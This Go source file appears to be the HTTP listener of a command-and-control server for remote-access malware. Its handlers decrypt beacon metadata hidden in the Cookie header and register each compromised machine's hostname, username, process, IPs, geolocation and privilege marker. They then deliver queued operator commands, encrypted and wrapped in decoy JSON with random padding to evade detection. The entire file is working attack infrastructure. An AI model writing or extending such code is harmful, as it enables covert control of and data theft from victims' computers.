package communication

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"encoding/binary"
	"encoding/json"
	"github.com/gin-gonic/gin"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func Get(c *gin.Context) {
	cookieValue := c.GetHeader("Cookie")

	encryptMetainfo := strings.TrimPrefix(cookieValue, config.Http_get_metadata_prepend)

	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{})
	}

	metainfo, err := encrypt.Decrypt(tmpMetainfo)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{})
	}

	uid := encrypt.BytesToMD5(metainfo)

	var client database.Clients
	exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
	if !exsists { // FirstBlood
		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = "web"
		connection.MuClientListenerType.Unlock()

		processID := binary.BigEndian.Uint32(metainfo[:4])
		flag := int(metainfo[4:5][0])
		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
		localIP := utils.Uint32ToIP(ipInt).String()
		osInfo := string(metainfo[9:])

		osArray := strings.Split(osInfo, "\t")
		hostName := osArray[0]
		UserName := osArray[1]
		processName := osArray[2]

		// 外网 ip
		externalIp := c.ClientIP()
		if externalIp == "::1" {
			externalIp = "127.0.0.1"
		}
		//地址
		//q := qqwry.NewQQwry("qqwry.dat")
		//q.Find(externalIp)
		//address := q.Country
		address, _ := qqwry.GetLocationByIP(externalIp)

		currentTime := time.Now()
		timeFormat := "01-02 15:04"
		formattedTime := currentTime.Format(timeFormat)

		arch := "x86"

		if flag > 8 {
			UserName += "*"
			flag = flag - 8
		}
		if flag > 4 {
			arch = "x64"
		}

		database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "5", Color: ""})
		database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
		database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

		successBytes, _ := encrypt.Encrypt([]byte("success"))
		pos1, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		pos2, _ := encrypt.EncodeBase64(successBytes)
		pos3, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())

		c.JSON(http.StatusOK, gin.H{"data": gin.H{
			"log_id": encrypt.GenRandomLogID(),
			"action_rule": gin.H{
				"pos_1": pos1,
				"pos_2": pos2,
				"pos_3": pos3,
			},
		}})
	} else { // PullCommands
		var pos1, pos2, pos3 []byte
		cmdBytes, ok := command.CommandQueues.GetCommand(uid)

		if ok && len(cmdBytes) > 0 {
			cmdBytes, _ = encrypt.Encrypt(cmdBytes)
			cmdBytes, _ = encrypt.Encrypt(cmdBytes)
			cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = cmdBase64
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			c.JSON(http.StatusOK, gin.H{"data": gin.H{
				"log_id": encrypt.GenRandomLogID(),
				"action_rule": gin.H{
					"pos_1": pos1,
					"pos_2": pos2,
					"pos_3": pos3,
				},
			}})

		} else {

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = []byte{}
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			c.JSON(http.StatusOK, gin.H{"data": gin.H{
				"log_id": encrypt.GenRandomLogID(),
				"action_rule": gin.H{
					"pos_1": pos1,
					"pos_2": pos2,
					"pos_3": pos3,
				},
			}})
		}

	}

}
func GetHttp(w http.ResponseWriter, r *http.Request) {
	cookieValue := r.Header.Get("Cookie")

	encryptMetainfo := strings.TrimPrefix(cookieValue, config.Http_get_metadata_prepend)

	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
	}

	metainfo, err := encrypt.Decrypt(tmpMetainfo)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
	}

	uid := encrypt.BytesToMD5(metainfo)

	var client database.Clients
	exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
	if !exsists { // FirstBlood
		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = "web"
		connection.MuClientListenerType.Unlock()

		processID := binary.BigEndian.Uint32(metainfo[:4])
		flag := int(metainfo[4:5][0])
		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
		localIP := utils.Uint32ToIP(ipInt).String()
		osInfo := string(metainfo[9:])

		osArray := strings.Split(osInfo, "\t")
		hostName := osArray[0]
		UserName := osArray[1]
		processName := osArray[2]

		// 外网 ip
		externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			externalIp = r.RemoteAddr
		}
		if externalIp == "::1" {
			externalIp = "127.0.0.1"
		}
		//地址
		//q := qqwry.NewQQwry("qqwry.dat")
		//q.Find(externalIp)
		//address := q.Country
		address, _ := qqwry.GetLocationByIP(externalIp)

		currentTime := time.Now()
		timeFormat := "01-02 15:04"
		formattedTime := currentTime.Format(timeFormat)

		arch := "x86"

		if flag > 8 {
			UserName += "*"
			flag = flag - 8
		}
		if flag > 4 {
			arch = "x64"
		}

		database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "5", Color: ""})
		database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
		database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

		successBytes, _ := encrypt.Encrypt([]byte("success"))
		pos1, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		pos2, _ := encrypt.EncodeBase64(successBytes)
		pos3, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())

		response := map[string]interface{}{
			"data": map[string]interface{}{
				"log_id": encrypt.GenRandomLogID(),
				"action_rule": map[string][]byte{
					"pos_1": pos1,
					"pos_2": pos2,
					"pos_3": pos3,
				},
			},
		}

		// 设置 Content-Type 为 JSON
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)

		// 编码 JSON 并写入响应
		json.NewEncoder(w).Encode(response)
	} else { // PullCommands
		var pos1, pos2, pos3 []byte
		cmdBytes, ok := command.CommandQueues.GetCommand(uid)

		if ok && len(cmdBytes) > 0 {
			cmdBytes, _ = encrypt.Encrypt(cmdBytes)
			cmdBytes, _ = encrypt.Encrypt(cmdBytes)
			cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = cmdBase64
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())

			response := map[string]interface{}{
				"data": map[string]interface{}{
					"log_id": encrypt.GenRandomLogID(),
					"action_rule": map[string][]byte{
						"pos_1": pos1,
						"pos_2": pos2,
						"pos_3": pos3,
					},
				},
			}

			// 设置 Content-Type 为 JSON
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)

			// 编码 JSON 并写入响应
			json.NewEncoder(w).Encode(response)

		} else {

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = []byte{}
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			response := map[string]interface{}{
				"data": map[string]interface{}{
					"log_id": encrypt.GenRandomLogID(),
					"action_rule": map[string][]byte{
						"pos_1": pos1,
						"pos_2": pos2,
						"pos_3": pos3,
					},
				},
			}

			// 设置 Content-Type 为 JSON
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)

			// 编码 JSON 并写入响应
			json.NewEncoder(w).Encode(response)
		}

	}

}
